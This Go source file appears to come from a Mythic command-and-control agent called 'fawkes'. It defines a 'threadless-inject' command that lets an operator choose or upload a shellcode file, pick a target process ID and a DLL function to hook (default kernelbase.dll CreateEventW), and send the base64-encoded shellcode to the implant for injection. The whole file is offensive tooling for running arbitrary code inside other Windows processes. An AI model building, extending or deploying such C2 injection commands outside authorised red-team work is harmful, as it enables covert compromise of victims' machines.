package agentfunctions

import (
	"encoding/base64"
	"encoding/json"
	"fmt"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "threadless-inject",
		Description:         "Inject shellcode into a remote process using threadless injection (function hooking)",
		HelpString:          "threadless-inject",
		Version:             1,
		MitreAttackMappings: []string{"T1055"},
		SupportedUIFeatures: []string{"file_browser:upload"},
		Author:              "@galoryber",
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:                 "filename",
				ModalDisplayName:     "Shellcode File",
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Description:          "Select a shellcode file from the list",
				Choices:              []string{},
				DefaultValue:         "",
				DynamicQueryFunction: getShellcodeFileList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "Default",
						UIModalPosition:     0,
					},
				},
			},
			{
				Name:             "file",
				ModalDisplayName: "Shellcode File",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_FILE,
				Description:      "Upload a new shellcode file",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "New File",
						UIModalPosition:     0,
					},
				},
			},
			{
				Name:             "pid",
				ModalDisplayName: "Process ID",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				Description:      "Target process ID to inject into",
				DefaultValue:     0,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "Default",
						UIModalPosition:     1,
					},
					{
						ParameterIsRequired: true,
						GroupName:           "New File",
						UIModalPosition:     1,
					},
				},
			},
			{
				Name:             "dll_name",
				ModalDisplayName: "DLL Name",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "DLL containing the function to hook (e.g., kernelbase.dll)",
				DefaultValue:     "kernelbase.dll",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
						UIModalPosition:     2,
					},
					{
						ParameterIsRequired: false,
						GroupName:           "New File",
						UIModalPosition:     2,
					},
				},
			},
			{
				Name:             "function_name",
				ModalDisplayName: "Function Name",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Function to hook (e.g., CreateEventW)",
				DefaultValue:     "CreateEventW",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
						UIModalPosition:     3,
					},
					{
						ParameterIsRequired: false,
						GroupName:           "New File",
						UIModalPosition:     3,
					},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}

			// Resolve file contents by checking actual args (not ParameterGroupName)
			filename, fileContents, err := resolveFileContents(taskData)
			if err != nil {
				response.Success = false
				response.Error = err.Error()
				return response
			}

			// Get the target PID
			pid, err := taskData.Args.GetNumberArg("pid")
			if err != nil {
				response.Success = false
				response.Error = "Failed to get target PID: " + err.Error()
				return response
			}

			if pid <= 0 {
				response.Success = false
				response.Error = "Invalid PID specified (must be greater than 0)"
				return response
			}

			// Get optional DLL name
			dllName := "kernelbase.dll"
			if dll, err := taskData.Args.GetStringArg("dll_name"); err == nil && dll != "" {
				dllName = dll
			}

			// Get optional function name
			functionName := "CreateEventW"
			if fn, err := taskData.Args.GetStringArg("function_name"); err == nil && fn != "" {
				functionName = fn
			}

			// Build the display parameters
			displayParams := fmt.Sprintf("Shellcode: %s (%d bytes)\nTarget PID: %d\nDLL: %s\nFunction: %s",
				filename, len(fileContents), int(pid), dllName, functionName)
			response.DisplayParams = &displayParams
			createArtifact(taskData.Task.ID, "Process Inject", fmt.Sprintf("Threadless injection into PID %d via %s!%s (%d bytes)", int(pid), dllName, functionName, len(fileContents)))

			// Build the actual parameters JSON that will be sent to the agent
			// Encode shellcode contents as base64 to embed in JSON
			params := map[string]interface{}{
				"shellcode_b64":  base64.StdEncoding.EncodeToString(fileContents),
				"pid":            int(pid),
				"dll_name":       dllName,
				"function_name":  functionName,
			}

			paramsJSON, err := json.Marshal(params)
			if err != nil {
				response.Success = false
				response.Error = "Failed to create task parameters: " + err.Error()
				return response
			}

			// Set the parameters as a JSON string
			taskData.Args.SetManualArgs(string(paramsJSON))

			return response
		},
	})
}

// getShellcodeFileList returns a list of shellcode files (typically .bin files)
func getShellcodeFileList(msg agentstructs.PTRPCDynamicQueryFunctionMessage) []string {
	search, err := mythicrpc.SendMythicRPCFileSearch(mythicrpc.MythicRPCFileSearchMessage{
		CallbackID:      msg.Callback,
		LimitByCallback: false,
		MaxResults:      -1,
	})
	if err != nil {
		return []string{"No shellcode files found"}
	}

	if !search.Success {
		return []string{"Error searching for files"}
	}

	var fileList []string
	for _, file := range search.Files {
		// Look for common shellcode extensions
		if hasSuffix(file.Filename, ".bin") || hasSuffix(file.Filename, ".shellcode") || hasSuffix(file.Filename, ".raw") {
			fileList = append(fileList, file.Filename)
		}
	}

	if len(fileList) == 0 {
		return []string{"No shellcode files found"}
	}

	return fileList
}

func hasSuffix(s, suffix string) bool {
	return len(s) >= len(suffix) && s[len(s)-len(suffix):] == suffix
}
